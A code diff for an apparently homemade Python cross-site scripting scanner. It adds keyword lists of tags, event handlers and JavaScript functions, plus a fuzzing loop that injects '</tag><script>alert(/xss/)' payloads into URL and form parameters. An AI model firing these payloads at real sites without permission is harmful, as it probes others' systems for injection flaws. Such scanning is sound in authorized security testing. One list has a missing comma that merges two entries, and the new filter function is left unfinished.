@@ -150,6 +150,15 @@ def get_output_position(links):
                         plinks[murl][method]['page'].append(k)
     return plinks
 
+def get_xss_filter(links):
+    '''
+    find filtered keyword
+    '''
+    quotes = ['<','>','/','\'','\"','`','(',')',';','=','&','#','\\','{','}','+','-','%','*',':']
+    program = ['alert','prompt','confirm''javascript','data']
+    tagname = ['script','img','svg','video','audio','canvas','iframe','embed','a','object','x','marquee','form','input','menu','keygen','select','xss','isindex','meta','bgsound']
+    onevent = ['onerror','onmouseover','onload','autofocus','onfocus','data','href','onclick','oncopy','oncut','ondrag','oninput','onkeydown','onkeypress','onkeyup','onmousemove','onmouseup','onmousedown','onmouseout','onparse','onpageshow','onscroll','onresize','onhelp','onstart','onfinish','onloadstart','onblur','onsubmit','onchange','onshow','style','action','content','src']
+    '''Use if ... else to get instead of BRUTE'''
 
 def inject_xss_payload(links):
     '''
@@ -158,33 +167,29 @@ def inject_xss_payload(links):
     for murl,mitem in links.items():
         for method,item in mitem.items():
             for pos,params in item.items():
-                for p in params:
-                    rnd = ''.join(random.sample(string.ascii_letters,8))
-                    regex_tagname = r'(?<=\<)(.*)?(?=\>{0})'.format(rnd)
-                    if pos == 'tags':
+                data = dict(zip(params,[''.join(random.sample(string.ascii_letters,8)) for _ in params]))
+                if method == 'get':
+                    response = requests.get(murl,params=data)
+                else:
+                    response = requests.post(murl,data=data)
+                for k,v in data.items():
+                    regex_tagname = r'(?<=\<)(.*)?(?=\>{0})'.format(v)
+                    tagname = re.findall(regex_tagname,response.text)
+                    for tag in tagname:
+                        fuzz = data
+                        payload = '</{0}><script>alert(/xss/)'.format(tag)
+                        fuzz[k] = payload
                         if method == 'get':
-                            response = requests.get(murl,params={p:rnd})
+                            response = requests.get(murl, params=fuzz)
                         else:
-                            response = requests.post(murl,data={p:rnd})
-                        tagname = re.findall(regex_tagname,response.text)
-                        for tag in tagname:
-                            payload = '</{0}><script>alert(/xss/)</script>'.format(tag)
-                            if method == 'get':
-                                response = requests.get(murl, params={p:payload})
-                            else:
-                                response = requests.post(murl,data={p:payload})
-                            if response.text.find(payload) != -1:
-                                print(p,'detect xss:',payload)
-                    elif pos == 'attrs':
-                        rnd = ''.join(random.sample(string.ascii_letters,8))
-                    elif pos == 'js':
-                        rnd = ''.join(random.sample(string.ascii_letters,8))
-                    else:
-                        rnd = ''.join(random.sample(string.ascii_letters,8))
+                            response = requests.post(murl,data=fuzz)
+                        if response.text.find(payload) != -1:
+                            print(k,'detect xss:',payload)
 
 
 ulinks = get_dynamic_links_url(url)
 flinks = get_dynamic_links_form(url)
 plinks1 = get_output_position(ulinks)
 plinks2 = get_output_position(flinks)
+get_xss_filter(plinks1)
 inject_xss_payload(plinks1)
